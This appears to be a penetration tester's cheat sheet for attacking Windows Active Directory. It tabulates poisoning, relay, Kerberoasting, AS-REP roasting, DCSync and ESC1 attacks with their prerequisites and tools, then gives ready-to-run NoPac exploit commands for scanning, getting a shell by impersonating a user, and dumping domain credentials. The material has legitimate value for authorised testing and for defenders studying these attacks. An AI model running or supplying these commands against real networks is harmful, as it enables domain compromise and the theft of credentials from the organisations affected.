
| Attack                       | Requirements                                                                                       | Tools                         |
| ---------------------------- | -------------------------------------------------------------------------------------------------- | ----------------------------- |
| ***LLMNR/NBT-NS Poisoning*** | Attacker on same subnet, LLMNR/NBT-NS enabled, victim attempts to connect to non-existent hostname | Responder/Inveigh             |
| ***SMB/NTLM Relay***         | Auth coercion, SMB signing disabled, victim is local admin                                         | Impacket-ntlmrelayx           |
| ***Kerberoasting***          | Domain creds, account has SPN, password is crackable                                               | Rubeus/Impacket-GetUserSPNs   |
| ***ASREPRoasting***          | No kerberos preauth, crackable password                                                            | Rubeus/Impacket-GetNPUsers    |
| ***DCSync***                 | Replicating Directory Changes, Replicating Directory Changes All                                   | Mimikatz/Impacket-secretsdump |
| ***ESC1***                   | Domain creds, active AD CS, published template with "Enroll" rights, template allows client auth   |                               |
#### NoPac
```
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -use-ldap

#Shell
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_HOSTNAME> -shell --impersonate <USER> -use-ldap

#DCSync
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>  -dc-host <DC_HOSTNAME> --impersonate <USER> -use-ldap -dump -just-dc-user <DOMAIN>/<USER>
```